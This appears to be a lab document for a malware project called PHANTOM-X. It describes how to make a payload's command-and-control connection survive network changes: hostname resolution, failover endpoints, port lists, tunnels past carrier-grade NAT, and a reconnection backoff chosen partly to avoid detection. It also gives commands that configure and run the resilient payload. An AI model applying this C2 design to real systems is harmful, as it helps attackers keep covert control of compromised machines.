# PHANTOM-X -- Running across networks

**This is the document for the situation where the VM and the C2 are not
on the same network.**

That is the normal case, not an edge case. The operator's laptop moves
between the office wifi, a mobile hotspot, a hotel, a friend's house. The
lab has to work on all of them.

---

## The problem, stated exactly

The operator's laptop runs the Windows 11 Pro VM. The C2 server runs on a
different machine, on a different network.

```
   laptop                          Kali
  ┌──────────┐                   ┌──────────┐
  │   VM     │                   │   C2     │
  │ Win11Pro │                   │  server  │
  └────┬─────┘                   └────┬─────┘
       │  wifi (192.168.1.x)           │  hotspot (10.x.x.x)
       │                                │
       └──────── different L3 ──────────┘
```

The VM's packets go to the laptop's default gateway and stop there. They
never reach the hotspot. No amount of payload work fixes that: it is a
routing fact, not a bug.

**And the reverse problem is worse.** On a phone hotspot, the Kali machine
usually has a private address behind carrier-grade NAT. Even if the VM
*could* reach the hotspot, nothing could reach Kali from the internet,
because there is no port forward and no public address to forward to.

---

## The fix: a hostname, not an address

This is the whole answer, and it is the reason the payload takes a name
rather than an address.

| | hardcoded address | hostname |
|---|---|---|
| operator moves networks | dead — the address is wrong | works — DNS gives the current address |
| operator's address changes | dead | works |
| several C2 machines | one address only | several A records, tried in turn |
| operator behind CGNAT | impossible | still needs a public way in |

The payload resolves the name **every time it connects**, not once at
build time. That matters: DNS answers can change, and a payload that
cached the answer at startup would have the same problem as a hardcoded
address.

### The `resilient` arm

```powershell
cd phase3_fileless\loader
.\build_variants.ps1
```

Produces `px_payload_resilient.exe`, which adds:

1. **A list of candidate endpoints** — `PX_C2_ENDPOINTS`, a
   comma-separated list of `host:port` pairs. The first is the primary;
   the rest are fallbacks.

2. **Every address a name resolves to** — a domain with several A records
   gives failover for free, and the payload tries each in turn.

3. **A port list** — so a network that blocks the lab's port can still be
   reached on one it permits.

4. **Reconnection with backoff** — 5, 10, 20, 40, 60, 60, 60... seconds.

The backoff is not only about stealth. A laptop that changes network
mid-session needs a few seconds to reassociate with the new one, and a
client that gives up after two seconds never gets there. A fixed short
interval would also be a signature in itself.

---

## Two ways to set this up

### Option A -- a real domain with a movable A record

The cleanest. You need a domain you control and somewhere to point it.

```
operator's public IP (dynamic, changes with the network)
        │
        ▼
   c2.lab.example  ──A record──>  your public IP
```

Set the A record to wherever the C2 is right now. When you move, update
the record.

Requirements:
- a domain (any registrar)
- the C2 reachable from the internet, which means port forwarding on
  your router or a tunnel

**For a phone hotspot, port forwarding is not possible.** Use option B.

### Option B -- a tunnel

The C2 connects out to a tunnel service and the tunnel forwards to it.
The C2 does not need to accept inbound connections at all, so it works
from behind any NAT, including a phone hotspot.

```
C2 ──outbound──> tunnel service ──> public URL
                                          │
VM on any network ────────────────────────┘
```

Then the payload's endpoint is the tunnel's public address.

Two practical notes:
- the tunnel's public address changes unless you pay for a fixed one
- some tunnel services need the client to keep a connection alive; a
  plain TCP forward is simpler if you can get one

### Option C -- both machines on the same hotspot

The simplest thing that works, and it is worth doing first so the lab is
usable before you set up infrastructure.

Put the laptop on the **same** hotspot as the Kali machine. Then they are
on one network and the VM can reach the C2 at the hotspot's internal
address.

```
   laptop (hotspot A)              Kali (hotspot A)
  ┌──────────┐                     ┌──────────┐
  │   VM     │───── same L3 ──────│   C2     │
  └──────────┘                     └──────────┘
```

The hotspot's gateway address (often `192.168.43.1` on Android) is the
Kali machine's address as seen from the laptop. Run the C2 bound to
`0.0.0.0` and point the payload at the gateway address.

This is not a real solution for a moving operator, but it is the fastest
way to get the lab running and to confirm the chain works at all.

---

## Finding the C2's address on a hotspot

```bash
# on the Kali machine
ip -4 addr show | grep -oP 'inet \K[\d.]+'

# or
hostname -I
```

The address that matters is the one on the **shared** network, not the
one on a wired interface.

---

## Checking reachability before you measure

Run this on the VM. It answers the question that actually blocks the
lab, and it separates the four things that can go wrong.

```bash
python3 phase5_network/netreach.py --host c2.lab.example --ports 9001,443
```

```
  DNS    : c2.lab.example -> 203.0.113.7

  203.0.113.7:9001   TIMEOUT   no answer -- the port is filtered or there is no route
  203.0.113.7:443    OPEN      the C2 accepted the connection (142 ms)

  RESULT: the C2 is reachable from here.
```

The four outcomes, and what each one means:

| Verdict | Meaning | Fix |
|---|---|---|
| `DID NOT RESOLVE` | the name does not resolve here | DNS. The name has to be a real one, not the lab's private DNS. |
| `REFUSED` | the name resolves, nothing is listening | the C2 is down, or bound to a different address |
| `TIMEOUT` | packets went nowhere | the port is filtered, or there is no route. Try another port. |
| `OPEN` | it works | |

**`TIMEOUT` on one port and `OPEN` on another** is the normal case on a
restrictive network, and it is why the payload has a port list.

---

## Configuring the payload

```powershell
# a single endpoint
$env:PX_C2_HOST = "c2.lab.example"
$env:PX_C2_PORT = "9001"

# several, tried in order
$env:PX_C2_ENDPOINTS = "c2.lab.example:9001,c2.lab.example:443,c2-backup.lab.example:9001"

# run the resilient build
.\px_payload_resilient.exe .\px_attack_chain.pdf .\loader.log
```

Or bake it in at build time:

```powershell
.\build_variants.ps1 -C2Host c2.lab.example -C2Port 9001
```

---

## What the network isolation still means

The isolation in `phase0_labnet` is about the **home** network: the VM
must not be able to reach your actual devices, and the payload must not
be able to wander into your LAN.

It does **not** mean the VM has no route to the C2. The C2 route is
allowed explicitly, and everything else is denied. The rules are:

```
allow   the lab segment
allow   TCP to the C2 address, on the C2 port
deny    everything else
```

When the C2 moves to a new address, the allow rule has to move with it.
Update it with:

```powershell
cd phase0_labnet
.\setup_vm_labnet.ps1 -LabGateway <NEW-C2-IP> -C2Port 9001
```

Or, better, allow the C2 by **name** so the rule does not have to be
edited every time the address changes.

---

## The honest summary

- **Same hotspot for both machines** — works today, no infrastructure.
- **A domain with a movable A record** — the right answer, needs a
  domain and a public way in.
- **A tunnel** — the right answer when the C2 is behind CGNAT, which is
  what a phone hotspot always is.

What does **not** work, and no payload change will fix it: a hardcoded
IP address with the two machines on different networks.
